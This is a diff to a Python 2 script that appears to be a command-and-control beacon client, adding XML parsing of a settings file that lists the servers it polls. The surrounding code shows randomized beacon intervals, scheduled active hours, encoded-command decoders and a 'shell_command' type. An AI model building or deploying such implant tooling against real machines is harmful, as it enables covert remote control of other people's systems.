@@ -1,8 +1,10 @@
 #!/usr/bin/env python
 
-from controller import Controller
+from controller import Controller, NODE_IP_KEY, NODE_PORT_KEY
 import time
 from random import randint
+import sys
+import xml.etree.ElementTree as ET
 
 #
 # Overall configurations should include:
@@ -22,22 +24,81 @@ from random import randint
 # - http://www.pythoncentral.io/pyinstaller-package-python-applications-windows-mac-linux/
 
 PROMPT = "[]>"
+DEFAULT_CONFIG_FILE = "settings.xml"
+NODES_TAG = 'nodes'
+NODE_TAG = 'node'
+N_TYPE_T = 'type'
+N_PORT_T = 'port'
+N_HOST_T = 'host'
+PARAMS_TAG = 'parameters'
+PARAM_TAG = 'parameter'
+P_NAME_T = 'name'
 
 MIN_SLEEP_INT = 60
 MAX_SLEEP_INT = 600
 ACTIVE_DAYS = ('M','T','W','Th','F','Sa','Su')
 ACTIVE_HOURS = ('0001','2359')
-NODES = [('http_get',{'node':'127.0.0.1','port':'8080','path':'sample_command.html'})
-        ,('http_get',{'node':'127.0.0.1','port':'8000','path':'sample_command.html'})
-        ,('http_get',{'node':'127.0.0.1','port':'8090','path':'sample_command.html'})]
 
 # global flag
 continue_beacon = True
+
+def get_xml():
+    
+    config_filename = DEFAULT_CONFIG_FILE
+    
+    if len(sys.argv) > 1:
+        config_filename = sys.argv[1]
+    
+    try:
+        xmltree = ET.parse(config_filename)
+        xmlroot = xmltree.getroot()
+    except IOError, io:
+        print '%s ERROR: Issue getting file \'%s\'. Make sure it exists at the appropriate path.' % (PROMPT, config_filename)
+        exit()
+    except Exception, e:
+        raise e
+        
+    return xmlroot
+    
+def parse_nodes(xml):
+    
+    nodes_list = []
+    for n in xml.findall(NODE_TAG):
+        
+        try:
+            n_type = n.attrib[N_TYPE_T]
+        
+            n_dict = {}
+            n_dict[NODE_PORT_KEY] = n.find(N_PORT_T).text
+            n_dict[NODE_IP_KEY] = n.find(N_HOST_T).text
+            
+        except:
+            print '%s Nodes must provide a type, host/ip and port at minimum' % (PROMPT)
+            raise
+        
+        for param in n.find(PARAMS_TAG).findall(PARAM_TAG):
+            n_dict[param.get(P_NAME_T)] = param.text
+        
+        nodes_list.append((n_type,n_dict))
+        
+    return nodes_list
 
 def load_config():
     #
     # this is where the configuration file is parsed.
     #
+    try:
+        config_xml = get_xml()
+        
+        parsed_nodes = parse_nodes(config_xml.find(NODES_TAG))
+        if len(parsed_nodes) > 0:
+            global NODES
+            NODES = parsed_nodes
+        
+    except Exception, e:
+        print '%s Fatal error parsing XML element - %s' % (PROMPT, e)
+        exit()
+
     beacons = ['http_get']
     commands = ['shell_command', 'test_command']
     decoders = ['base64c','rot13','jsonc']
